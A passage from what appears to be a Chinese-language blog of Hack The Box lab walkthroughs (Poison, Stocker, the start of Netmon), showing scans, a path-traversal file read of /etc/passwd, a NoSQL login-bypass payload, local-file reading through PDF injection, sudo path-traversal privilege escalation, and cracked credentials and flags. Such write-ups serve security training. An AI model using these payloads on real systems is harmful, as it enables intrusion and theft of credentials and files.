http://10.10.10.84/browse.php?file=../../../../../etc/passwd|grep \"/bin/csh\"  \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1894  100  1894    0     0  11999      0 --:--:-- --:--:-- --:--:-- 12063\nroot:*:0:0:Charlie &:/root:/bin/csh\ncharix:*:1001:1001:charix:/home/charix:/bin/csh\n```\n发现可以使用 bash 权限的用户就两个，一个是 root，一个是 charix，咱们肯定不可能直接到 root 吧？那我们就肯定是要找 charix 的突破点了\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# curl http://10.10.10.84/browse.php?file=pwdbackup.txt                         \nThis password is secure, it's encoded atleast 13 times.. what could go wrong really..\n\nVm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU\nbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS\nbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW\nM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs\nWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy\neG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G\nWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw\nMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa\nT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k\nWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk\nWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0\nNFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT\nVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz\nWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW\nVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO\nUkd4RVdub3dPVU5uUFQwSwo=\n```\n有一段 base64，解密一下看看\n\n```bash\nThis password is secure, it's encoded atleast 13 times.. what could go wrong really..\n这个密码是安全的，它至少被编译了 13 次...真的会出什么问题...\n```\n这他喵的居然得解密 13 次，真麻烦\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# echo \"Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU\nbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS\nbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW\nM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs\nWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy\neG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G\nWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw\nMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa\nT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k\nWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk\nWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0\nNFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT\nVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz\nWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW\nVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO\nUkd4RVdub3dPVU5uUFQwSwo=\"|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d\nCharix!2#4%6&8(0\n```\n最后得到了一个密码，去尝试是否可以登录 ssh\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh charix@10.10.10.84\nThe authenticity of host '10.10.10.84 (10.10.10.84)' can't be established.\nED25519 key fingerprint is SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.84' (ED25519) to the list of known hosts.\n(charix@10.10.10.84) Password for charix@Poison:\nLast login: Mon Mar 19 16:38:00 2018 from 10.10.14.4\nFreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017\n\nWelcome to FreeBSD!\n\nRelease Notes, Errata: https://www.FreeBSD.org/releases/\nSecurity Advisories:   https://www.FreeBSD.org/security/\nFreeBSD Handbook:      https://www.FreeBSD.org/handbook/\nFreeBSD FAQ:           https://www.FreeBSD.org/faq/\nQuestions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/\nFreeBSD Forums:        https://forums.FreeBSD.org/\n\nDocuments installed with the system are in the /usr/local/share/doc/freebsd/\ndirectory, or can be installed later with:  pkg install en-freebsd-doc\nFor other languages, replace \"en\" with a language code like de or fr.\n\nShow the version of FreeBSD installed:  freebsd-version ; uname -a\nPlease include that output and any error messages when posting questions.\nIntroduction to manual pages:  man man\nFreeBSD directory layout:      man hier\n\nEdit /etc/motd to change this login announcement.\nIf you want to play CDs with FreeBSD, a utility for this is already included.\nType 'cdcontrol' then 'help' to learn more.  (You may need to set the CDROM\nenvironment variable in order to make cdcontrol want to start.)\ncharix@Poison:~ % whoami&&id\ncharix\nuid=1001(charix) gid=1001(charix) groups=1001(charix)\n```\n成功登录 ssh\n\n```bash\ncharix@Poison:~ % cat user.txt \neaacdfb2d141b72a589233063604209c\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n```bash\ncharix@Poison:~ % ls\nsecret.zip      user.txt\ncharix@Poison:~ % ls -la\ntotal 48\ndrwxr-x---  2 charix  charix   512 Mar 19  2018 .\ndrwxr-xr-x  3 root    wheel    512 Mar 19  2018 ..\n-rw-r-----  1 charix  charix  1041 Mar 19  2018 .cshrc\n-rw-rw----  1 charix  charix     0 Mar 19  2018 .history\n-rw-r-----  1 charix  charix   254 Mar 19  2018 .login\n-rw-r-----  1 charix  charix   163 Mar 19  2018 .login_conf\n-rw-r-----  1 charix  charix   379 Mar 19  2018 .mail_aliases\n-rw-r-----  1 charix  charix   336 Mar 19  2018 .mailrc\n-rw-r-----  1 charix  charix   802 Mar 19  2018 .profile\n-rw-r-----  1 charix  charix   281 Mar 19  2018 .rhosts\n-rw-r-----  1 charix  charix   849 Mar 19  2018 .shrc\n-rw-r-----  1 root    charix   166 Mar 19  2018 secret.zip\n-rw-r-----  1 root    charix    33 Mar 19  2018 user.txt\n```\n这里有一个 secret.zip 的文件，下载下来看看\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# scp charix@10.10.10.84:/home/charix/secret.zip ./\n(charix@10.10.10.84) Password for charix@Poison:\nsecret.zip\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# file secret.zip \nsecret.zip: Zip archive data, at least v2.0 to extract, compression method=store\n```\n确实是 zip 类型的\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# unzip secret.zip \nArchive:  secret.zip\n[secret.zip] secret password:\n```\n但是需要一个解压密码，去破解一下\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# zip2john secret.zip > hash                           \nver 2.0 secret.zip/secret PKZIP Encr: cmplen=20, decmplen=8, crc=77537827 ts=9827 cs=7753 type=0\n\n┌──(root㉿kali)-[~/Desktop]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:00 DONE (2023-02-08 19:04) 0g/s 16299Kp/s 16299Kc/s 16299KC/s \"2parrow\"..*7¡Vamos!\nSession completed.\n```\n爆破没有成功，尝试一下 charix 的登录密码呢？\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# unzip secret.zip                 \nArchive:  secret.zip\n[secret.zip] secret password: \n extracting: secret\n```\n好吧，是我给想复杂了\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# file secret    \nsecret: Non-ISO extended-ASCII text, with no line terminators\n                                                                                                                                                                                                                   \n┌──(root㉿kali)-[~/Desktop]\n└─# chmod +x secret\n                                                                                                                                                                                                                   \n┌──(root㉿kali)-[~/Desktop]\n└─# ./secret \n./secret: 1: ��[: not found\n./secret: 1: Ֆz!: not found\n```\n不是可执行文件，先放着吧，去看看本地端口\n\n```bash\ncharix@Poison:~ % netstat -an\nActive Internet connections (including servers)\nProto Recv-Q Send-Q Local Address          Foreign Address        (state)\ntcp4       0      0 10.10.10.84.22         10.10.16.2.46492       ESTABLISHED\ntcp4       0      0 127.0.0.1.25           *.*                    LISTEN\ntcp4       0      0 *.80                   *.*                    LISTEN\ntcp6       0      0 *.80                   *.*                    LISTEN\ntcp4       0      0 *.22                   *.*                    LISTEN\ntcp6       0      0 *.22                   *.*                    LISTEN\ntcp4       0      0 127.0.0.1.5801         *.*                    LISTEN\ntcp4       0      0 127.0.0.1.5901         *.*                    LISTEN\nudp4       0      0 *.514                  *.*                    \nudp6       0      0 *.514                  *.*                    \nActive UNIX domain sockets\nAddress          Type   Recv-Q Send-Q            Inode             Conn             Refs          Nextref Addr\nfffff80003b39d20 stream      0      0                0 fffff80003b39e10                0                0\nfffff80003b39e10 stream      0      0                0 fffff80003b39d20                0                0\nfffff80003b3a2d0 stream      0      0                0 fffff80003b3a3c0                0                0 /tmp/.X11-unix/X1\nfffff80003b3a3c0 stream      0      0                0 fffff80003b3a2d0                0                0\nfffff80003b3a5a0 stream      0      0                0 fffff80003b3a4b0                0                0 /tmp/.X11-unix/X1\nfffff80003b3a4b0 stream      0      0                0 fffff80003b3a5a0                0                0\nfffff80003b3a690 stream      0      0 fffff80003b32588                0                0                0 /tmp/.X11-unix/X1\nfffff80003b3ab40 stream      0      0 fffff80003ae6938                0                0                0 /var/run/devd.pipe\nfffff80003b3a0f0 dgram       0      0                0 fffff80003b3a960                0                0\nfffff80003b3a1e0 dgram       0      0                0 fffff80003b3a870                0 fffff80003b3a780\nfffff80003b3a780 dgram       0      0                0 fffff80003b3a870                0                0\nfffff80003b3a870 dgram       0      0 fffff80003c56000                0 fffff80003b3a1e0                0 /var/run/logpriv\nfffff80003b3a960 dgram       0      0 fffff80003c561d8                0 fffff80003b3a0f0                0 /var/run/log\nfffff80003b3aa50 seqpac      0      0 fffff80003ae6760                0                0                0 /var/run/devd.seqpacket.pipe\n```\n发现开着 VNC 端口\n\n```bash\nps -aux\n\nroot   529   0.0  0.9  23620  8872 v0- I    11:33    0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/\n```\n查看进程，发现 VNC 是由 root 用户运行的\n\n这边是内网的端口，我们无法访问，给他转发出来就可以了\n\n```bash\nssh -L 5901:127.0.0.1:5901 charix@10.10.10.84\n```\n然后使用 vncviewer 进行连接\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# vncviewer 127.0.0.1::5901 -passwd secret\n```\n```bash\nroot@Poison:~ # whoami&&id\nroot\nuid=0(root) gid=0(wheel) groups=0(wheel),5(operator)\n```\n成功提权到 root 权限\n\n```bash\nroot@Poison:~ # cat root.txt \n716d04b188419cf2bb99d891272361f5\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Stocker- Hackthebox","url":"/2023/01/14/Hackthebox/Easy/Hackthebox-Stocker/","content":"\n# Hackthebox - Stocker\n# 靶场信息\n![image](Hackthebox-Stocker/TPpQ-EMxXWuxhgAl9_7NOJhb7aRkyzU3JiN8hPqV22s.png)\n\n\n\n# 靶场类型\n![image](Hackthebox-Stocker/opqu06AoOlYHoIsYaWxITXxsaKQRRbq1ZvZT3PM8keY.png)\n\n\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.11.196\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 05:41 CST\nNmap scan report for 10.10.11.196\nHost is up (0.38s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)\n|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)\n|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://stocker.htb\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=1/23%OT=22%CT=1%CU=32979%PV=Y%DS=2%DC=T%G=Y%TM=63CDADB\nOS:2%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11\nOS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 554/tcp)\nHOP RTT       ADDRESS\n1   274.38 ms 10.10.16.1\n2   456.09 ms 10.10.11.196\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 53.20 seconds\n```\n这里需要加一个 hosts 解析\n\n```bash\necho 10.10.11.196 stocker.htb >> /etc/hosts\n```\n## Http\n![image](Hackthebox-Stocker/RF02Pe8VDnFsRZWvmu726Ul-KbLApPRqy3vRHtB0j0w.png)\n\n访问后就是个静态页面，没看到什么可以利用的东西，做一下 fuzz 吧\n\n## Fuzz\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://stocker.htb/ --no-error --append-domain\n===============================================================\nGobuster v3.3\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:             http://stocker.htb/\n[+] Method:          GET\n[+] Threads:         200\n[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:      gobuster/3.3\n[+] Timeout:         10s\n[+] Append Domain:   true\n===============================================================\n2023/01/23 05:53:18 Starting gobuster in VHOST enumeration mode\n===============================================================\nFound: dev.stocker.htb Status: 302 [Size: 28] [--> /login]\nProgress: 114420 / 114442 (99.98%)===============================================================\n2023/01/23 05:56:08 Finished\n===============================================================\n```\n发现一个虚拟主机，加入 hosts 解析\n\n```bash\necho 10.10.11.196 dev.stocker.htb >> /etc/hosts\n```\n然后再去访问一下\n\n## dev.stocker.htb\n![image](Hackthebox-Stocker/SjUGC_Avaejz5sxgi5JAwABUkDLE1bS16ImItymzCYU.png)\n\n是一个登录框\n\n# 漏洞利用\n这里是一个基础的 nosql 注入\n\n> [https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass)\n\n![image](Hackthebox-Stocker/5cPzaDCwVCpIXEeKu5uvXvwY7Qu7DosD1PbGvtClfaE.png)\n\n\n\n修改 Content-Type 内容为 application/json\n\n然后使用上面参考文献里的 `{\"username\": {\"$ne\": \"foo\"}, \"password\": {\"$ne\": \"bar\"} }` 进行绕过\n\n![image](Hackthebox-Stocker/5b8tEL_ka3ibmEDNOBqt3mm4-mKeKAZwB-gUiTR8YhY.png)\n\n成功登录，这里是一个购物中心\n\n![image](Hackthebox-Stocker/HWSFJdaynuHEbhdItVS3MzXKGS097mT-hwIwLkdAxrs.png)\n\n随便添加一个物品，然后抓个包看看\n\n![image](Hackthebox-Stocker/QpfI-demVcNhMax9cU81KTiAlrJfo_NscnwZBU1eDIY.png)\n\n去看一下提交后得到的订单文件\n\n![image](Hackthebox-Stocker/FZxXiMx-LApNtC7TSsJHrhTB2WAwcRTvjZKHKMsNqyQ.png)\n\n得到的是一个 pdf 格式的订单，尝试修改一下 Title 的内容呢？\n\n![image](Hackthebox-Stocker/NeiU6T4J9cQ8K3wRq93ILOWZeB32K60q3JyX-SNExjA.png)\n\n![image](Hackthebox-Stocker/_-i072QJXGkGQJbOzHemcHncz60mrn82p3-moAfFPek.png)\n\nok，也是可以成功修改的\n\n那么我们提交 iframe 之类的使其渲染时嵌入本地文件呢？\n\n![image](Hackthebox-Stocker/0nISbFG003fHH61XLSqACns5a8ADhco6bDR8Z2kerZ0.png)\n\n![image](Hackthebox-Stocker/KmCcyvicIoEVcVT02SMiYKJ_V_xRASPXlUTKxxmmlIs.png)\n\nok，也可行，读取成功\n\n然后就是无限读文件的测试，这里直接跳过，在 `/etc/passwd` 获得了账号。\n\n接着在 `/var/www/dev/index.js` 获得了密码\n\n![image](Hackthebox-Stocker/6HBzaCOKKXFZs9Fe6_YUgyPIfXvo7RY-ndbF35laOBU.png)\n\n```bash\nusername = angoose\npassword = IHeardPassphrasesArePrettySecure\n```\n然后使用 ssh 进行登录\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh angoose@10.10.11.196\nangoose@10.10.11.196's password: \nLast login: Sun Jan 22 22:39:59 2023 from 10.10.16.12\nangoose@stocker:~$ whoami&&id\nangoose\nuid=1001(angoose) gid=1001(angoose) groups=1001(angoose)\n```\n成功获得 user 权限\n\n```bash\nangoose@stocker:~$ ls\nuser.txt\nangoose@stocker:~$ cat user.txt\n6d51a15b13661ffb827c22f4a7662492\n```\n成功获得 user 权限的 flag 文件\n\n# 权限提升\n```bash\nangoose@stocker:~$ sudo -l\n[sudo] password for angoose: \nMatching Defaults entries for angoose on stocker:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser angoose may run the following commands on stocker:\n    (ALL) /usr/bin/node /usr/local/scripts/*.js\n```\n可以使用 sudo 权限调用 `/usr/bin/node` 执行 `/usr/local/scripts/` 目录下的所有 js 文件\n\n我们的目的只是要获取 `/root/root.txt` 文件的内容，那么就可以使用 js read file 来进行利用\n\n```bash\nconst fs = require('fs');\n\nfs.readFile('/root/root.txt', 'utf8', (err, data) => {\n  if (err) throw err;\n  console.log(data);\n});\n```\n在当前目录创建一个 js 内容，然后使用目录穿越来进行调用\n\n```bash\nangoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/exp.js \n45d08dd713ea28830a34b4186236290e\n```\n成功调用并利用我们自己创建的 js 文件，成功拿到 root 权限的 flag 文件\n\n\n\n\n\n\n\n","tags":["Hackthebox"]},{"title":"Netmon - Hackthebox","url":"/2023/01/08/Hackthebox/Easy/Hackthebox-Netmon/","content":"\n# Hackthebox - Netmon\n\n# 靶场信息\n\n![](Hackthebox-Netmon/d_AhIc_7eAII8iPdwsHy8jsLbvFWxGMvcRif8JLnig8.png)\n\n# 靶场类型\n\n![](Hackthebox-Netmon/xwcrA6hlnGsF3RbdRNGBi5kZDsJRxJp6Jw-bicGeCQs.png)\n\n# 信息收集\n\n## Nmap\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.10.152\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-08 04:24 CST\nNmap scan report for 10.10.10.152\nHost is up (0.49s latency).\nNot shown: 65522 closed tcp ports (reset)\nPORT      STATE SERVICE      VERSION\n21/tcp    open  ftp          Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 02-02-19  11:18PM                 1024 .rnd\n| 02-25-19  09:15PM       <DIR>          inetpub\n| 07-16-16  08:18AM       <DIR>          PerfLogs\n| 02-25-19  09:56PM       <DIR>          Program Files\n| 02-02-19  11:28PM       <DIR>          Program Files (x86)\n| 02-03-19  07:08AM       <DIR>          Users\n|_02-25-19  10:49PM       <DIR>          Windows\n| ftp-syst: \n|_  SYST: Windows_NT\n80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)\n| http-title: Welcome | PRTG Network Monitor (NETMON)\n|_Requested resource was /index.htm\n|_http-server-header: PRTG/18.1.37.13946\n|_http-trane-info: Problem with XML parsing of /evox/about\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49667/tcp open  msrpc        Microsoft Windows RPC\n49668/tcp open  msrpc        Microsoft Windows RPC\n49669/tcp open  msrpc        Microsoft Windows RPC\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=1/8%OT=21%CT=1%CU=35681%PV=Y%DS=2%DC=T%G=Y%TM=63B9D584\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A\nOS:)OPS(O1=M537NW8ST11%O2=M537NW8ST11%O3=M537NW8NNT11%O4=M537NW8ST11%O5=M53\nOS:7NW8ST11%O6=M537ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000\nOS:)ECN(R=Y%DF=Y%T=80%W=2000%O=M537NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+\nOS:%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T\nOS:=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0\nOS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S\nOS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R\nOS:=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N\nOS:%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -1s, deviation: 0s, median: -2s\n| smb2-time: \n|   date: 2023-01-07T20:26:34\n|_  start_date: 2023-01-07T20:23:08\n| smb-security-mode: \n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled but not required\n\nTRACEROUTE (using port 3306/tcp)\nHOP RTT       ADDRESS\n1   648.51 ms 10.10.16.1\n2   397.22 ms 10.10.10.152\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 117.23 seconds\n```\n\n# 漏洞利用\n\n## Ftp\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ftp 10.10.10.152                         \nConnected to 10.10.10.152.\n220 Microsoft FTP Service\nName (10.10.10.152:root): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword: \n230 User logged in.\nRemote system type is Windows_NT.\nftp> ls\n229 Entering Extended Passive Mode (|||49861|)\n125 Data connection already open; Transfer starting.\n02-02-19  11:18PM                 1024 .rnd\n02-25-19  09:15PM       <DIR>          inetpub\n07-16-16  08:18AM       <DIR>          PerfLogs\n02-25-19  09:56PM       <DIR>          Program Files\n02-02-19  11:28PM       <DIR>          Program Files (x86)\n02-03-19  07:08AM       <DIR>          Users\n02-25-19  10:49PM       <DIR>          Windows\n226 Transfer complete.\n```\n\nftp 可以使用匿名账户登录，并且还有一些目录文件\n\n```bash\nftp> pwd\nRemote directory: /users/Public\nftp> ls\n229 Entering Extended Passive Mode (|||49886|)\n125 Data connection already open; Transfer starting.\n02-03-19  07:05AM       <DIR>          Documents\n07-16-16  08:18AM       <DIR>          Downloads\n07-16-16  08:18AM       <DIR>          Music\n07-16-16  08:18AM       <DIR>          Pictures\n01-07-23  03:23PM                   34 user.txt\n07-16-16  08:18AM       <DIR>          Videos\n226 Transfer complete.\nftp> get user.txt\nlocal: user.txt remote: user.txt\n229 Entering Extended Passive Mode (|||49887|)\n125 Data connection already open; Transfer starting.\n100% |**********************************************************************************************************************************************************************|    34        0.05 KiB/s    00:00 ETA\n226 Transfer complete.\n34 bytes received in 00:00 (0.03 KiB/s)\n```\n\n在目录 `/users/public` 中找到了 user.txt 文件，并且可以 get 请求到本地\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# cat user.txt\nd79ce5330dd16fc989a3fbf6e31f5259\n```\n\n成功拿到 user 权限的 flag 文件\n\n```bash\nftp> get license.rtf\nlocal: license.rtf remote: license.rtf\n229 Entering Extended Passive Mode (|||50056|)\n125 Data connection already open; Transfer starting.\n100% |**********************************************************************************************************************************************************************| 50098       48.91 KiB/s    00:00 ETAftp: Reading from network: 被中断的系统调用\n  0% |                                                                                                                                                                      |    -1        0.00 KiB/s    --:-- ETA\n226 Transfer complete.\nftp> pwd\nRemote directory: /windows/system32\n```\n\n在目录 `/windows/system32` 下成功下载到了 license.rtf 文件，并且成功从该文件中获取到了系统版本 `MICROSOFT WINDOWS SERVER 2016 STANDARD AND DATACENTER` \n\n找到了一篇文章\n\n> [https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data)\n\n![](Hackthebox-Netmon/gnSaFdTAsKx3GMATXX2hPvWg-pFjOsYt1r08CcoRXYI.png)\n\n该文章显示 windows server 2016 的 RPTG 默认安装目录在 `programdata` 中，去查看一下\n\n```bash\nftp> cd programdata \n250 